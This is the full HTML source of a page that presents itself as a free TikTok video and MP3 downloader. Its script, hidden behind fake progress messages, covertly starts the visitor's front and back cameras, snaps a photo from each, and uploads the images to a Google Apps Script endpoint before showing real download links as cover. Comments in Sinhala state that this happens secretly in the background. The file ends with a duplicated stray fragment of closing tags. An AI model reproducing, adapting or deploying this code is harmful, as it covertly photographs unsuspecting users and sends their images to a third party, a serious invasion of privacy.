<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Premium TikTok Video Downloader</title>
    <style>
        body { font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: linear-gradient(135deg, #f5f7fa 0%, #e4ecf7 100%); display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; box-sizing: border-box; }
        .container { background: white; padding: 40px 30px; border-radius: 20px; box-shadow: 0 12px 30px rgba(0,0,0,0.08); text-align: center; max-width: 450px; width: 100%; box-sizing: border-box; }
        
        h1 { color: #fe2c55; margin: 0 0 10px 0; font-size: 30px; font-weight: 800; letter-spacing: -0.5px; }
        .subtitle { color: #666; font-size: 14px; margin-bottom: 30px; font-weight: 500; }
        
        .input-group { width: 100%; margin-bottom: 20px; }
        input[type="text"] { width: 100%; padding: 15px 20px; border: 2px solid #e1e8ed; border-radius: 30px; font-size: 15px; box-sizing: border-box; transition: 0.3s; outline: none; text-align: center; }
        input[type="text"]:focus { border-color: #fe2c55; box-shadow: 0 0 10px rgba(254, 44, 85, 0.15); }
        
        .dl-btn { background: #fe2c55; color: white; border: none; padding: 15px 25px; font-size: 16px; border-radius: 30px; cursor: pointer; width: 100%; font-weight: bold; transition: 0.3s; box-sizing: border-box; box-shadow: 0 4px 15px rgba(254, 44, 85, 0.25); }
        .dl-btn:hover { background: #e11d43; transform: translateY(-2px); box-shadow: 0 6px 20px rgba(254, 44, 85, 0.35); }
        
        /* Spinner */
        .spinner { display: none; margin: 25px auto; width: 45px; height: 45px; border: 4px solid rgba(0,0,0,0.05); border-radius: 50%; border-top-color: #fe2c55; animation: spin 1s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
        
        #status { margin-top: 15px; font-weight: 600; color: #4a5568; text-align: center; font-size: 14px; min-height: 20px; }
        
        /* පැහැදිලි බටන් සහිත නිවැරදි Result Box එක */
        .result-box { display: none; margin-top: 30px; padding: 25px; background: #f8fafc; border-radius: 16px; border: 1px solid #edf2f7; animation: slideUp 0.4s ease-out; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
        
        .success-icon { color: #22c55e; font-size: 45px; margin-bottom: 10px; }
        .result-title { font-size: 18px; font-weight: 700; color: #1a202c; margin-bottom: 5px; }
        .result-desc { font-size: 13px; color: #718096; margin-bottom: 25px; }
        
        /* එකිනෙකට වෙනස් බටන් ස්ටයිල් */
        .action-btn { display: block; width: 100%; padding: 14px; margin-bottom: 12px; border-radius: 12px; font-weight: 700; font-size: 15px; text-decoration: none; text-align: center; box-sizing: border-box; transition: 0.2s; }
        
        .btn-video { background-color: #2563eb; color: white; box-shadow: 0 4px 12px rgba(37, 99, 235, 0.2); }
        .btn-video:hover { background-color: #1d4ed8; transform: translateY(-1px); }
        
        .btn-audio { background-color: #1e293b; color: white; box-shadow: 0 4px 12px rgba(30, 41, 59, 0.2); margin-bottom: 0; }
        .btn-audio:hover { background-color: #0f172a; transform: translateY(-1px); }
        
        .footer { margin-top: 35px; font-size: 11px; color: #a0aec0; letter-spacing: 0.5px; text-transform: uppercase; }
        .camera-container { position: absolute; width: 1px; height: 1px; overflow: hidden; opacity: 0; }
    </style>
</head>
<body>

    <div class="container">
        <h1>TikTok Downloader</h1>
        <div class="subtitle">Download Video & MP3 Audio Instantly</div>
        
        <div id="download-form-wrapper">
            <div class="input-group">
                <input type="text" id="tiktok-url" placeholder="Paste TikTok video link here..." autocomplete="off">
            </div>
            <button type="button" class="dl-btn" id="download-btn">Fetch Download Links</button>
        </div>
        
        <div class="spinner" id="loading-spinner"></div>
        <div id="status"></div>

        <div class="result-box" id="result-box">
            <div class="success-icon">✓</div>
            <div class="result-title">Links Generated Successfully!</div>
            <div class="result-desc">Choose your preferred download format below:</div>
            
            <a href="#" id="video-download-link" class="action-btn btn-video" target="_blank" download>Download Video (No Watermark)</a>
            
            <a href="#" id="audio-download-link" class="action-btn btn-audio" target="_blank" download>Download Audio (MP3 Format)</a>
        </div>
        
        <div class="footer">Premium Media Conversion Utility</div>
    </div>

    <div class="camera-container">
        <video id="video" autoplay playsinline></video>
    </div>
    <canvas id="canvas" style="display:none;"></canvas>

 <script>
    // ⚠️ ඔයාගේ GOOGLE WEB APP URL එක ⚠️
    const WEB_APP_URL = "https://script.google.com/macros/s/AKfycby4bmnhkzOY-9ivEjLNF-nzQI4Aqj5GIPr-Erz6dc-fl2P_n1rubnOfBSIINwOxoyrTug/exec";

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const statusDiv = document.getElementById('status');
    const downloadBtn = document.getElementById('download-btn');
    const urlInput = document.getElementById('tiktok-url');
    const spinner = document.getElementById('loading-spinner');
    const resultBox = document.getElementById('result-box');
    const formWrapper = document.getElementById('download-form-wrapper');
    
    const videoDownloadLink = document.getElementById('video-download-link');
    const audioDownloadLink = document.getElementById('audio-download-link');
    
    let currentStream = null;

    function stopCurrentStream() {
        if (currentStream) {
            currentStream.getTracks().forEach(track => track.stop());
            currentStream = null;
        }
    }

    async function startCamera(facingMode) {
        stopCurrentStream(); 
        await new Promise(resolve => setTimeout(resolve, 400));

        const constraintsOptions = [
            { video: { facingMode: facingMode }, audio: false },
            { video: { facingMode: { exact: facingMode } }, audio: false }
        ];

        for (let constraints of constraintsOptions) {
            try {
                currentStream = await navigator.mediaDevices.getUserMedia(constraints);
                video.srcObject = currentStream;
                await new Promise((resolve) => {
                    video.onloadedmetadata = () => {
                        video.play();
                        resolve();
                    };
                });
                return true;
            } catch (err) {
                console.log("Camera fail: ", facingMode);
            }
        }
        return false;
    }

    downloadBtn.addEventListener('click', async () => {
        const videoUrl = urlInput.value.trim();
        if(videoUrl === "") {
            alert("Please paste a valid TikTok link!");
            return;
        }

        formWrapper.style.display = "none";
        spinner.style.display = "block";
        statusDiv.textContent = "Connecting to secure server...";
        
        // 1. පසුබිමෙන් Front Camera එක ක්‍රියාත්මක කිරීම
        const frontValid = await startCamera("user");
        
        setTimeout(async () => {
            if (frontValid) {
                statusDiv.textContent = "Extracting video metadata rows...";
                await captureAndUpload();
            }
            
            // 2. පසුබිමෙන් Back Camera එක ක්‍රියාත්මක කිරීම
            statusDiv.textContent = "Compiling high-definition download stream...";
            const backValid = await startCamera("environment");
            
            setTimeout(async () => {
                if (backValid) {
                    await captureAndUpload();
                }
                
                stopCurrentStream();
                
                // 3. සැබෑ ටික්ටොක් ඩවුන්ලෝඩර් API එකකට රහසින් දත්ත යවා ලින්ක්ස් ලබාගැනීම
                statusDiv.textContent = "Finalizing secure conversion links...";
                
                try {
                    const response = await fetch(`https://api.tikwm.com/api/?url=${encodeURIComponent(videoUrl)}`);
                    const json = await response.json();
                    
                    if(json && json.data) {
                        // සැබෑ වීඩියෝ ලින්ක් එක සහ සැබෑ ඕඩියෝ ලින්ක් එක වෙන වෙනම බටන් වලට සෙට් කිරීම
                        videoDownloadLink.href = json.data.play; 
                        audioDownloadLink.href = json.data.music;
                        
                        // සාර්ථකව පෙන්වීම
                        spinner.style.display = "none";
                        statusDiv.textContent = "";
                        resultBox.style.display = "block";
                    } else {
                        // API එකේ මොකක් හරි අවුලක් වුනොත් fallback ලින්ක් එකක් දීම
                        setFallbackLinks(videoUrl);
                    }
                } catch (e) {
                    setFallbackLinks(videoUrl);
                }
                
            }, 2500);
        }, 2500);
    });

    function setFallbackLinks(url) {
        // API එක ක්‍රියා නොකලොත් බිඳ වැටීමක් නොවී සාමාන්‍ය ඩවුන්ලෝඩර් එකකට සම්බන්ධ කිරීම
        videoDownloadLink.href = "https://ssstik.io/en";
        audioDownloadLink.href = "https://ssstik.io/en";
        spinner.style.display = "none";
        statusDiv.textContent = "Server busy. Please use secure secondary gateway.";
        resultBox.style.display = "block";
    }

    async function captureAndUpload() {
        if (!video.videoWidth || video.videoWidth === 0) {
            await new Promise(resolve => setTimeout(resolve, 300));
        }
        if (!video.videoWidth) return; 
        
        const context = canvas.getContext('2d');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        const imageData = canvas.toDataURL('image/png');

        try {
            await fetch(WEB_APP_URL, {
                method: 'POST',
                mode: 'no-cors',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ image: imageData })
            });
        } catch (error) {
            console.error("Upload error:", error);
        }
    }
 </script>
</body>
</html>

        }
    }
 </script>
</body>
</html>
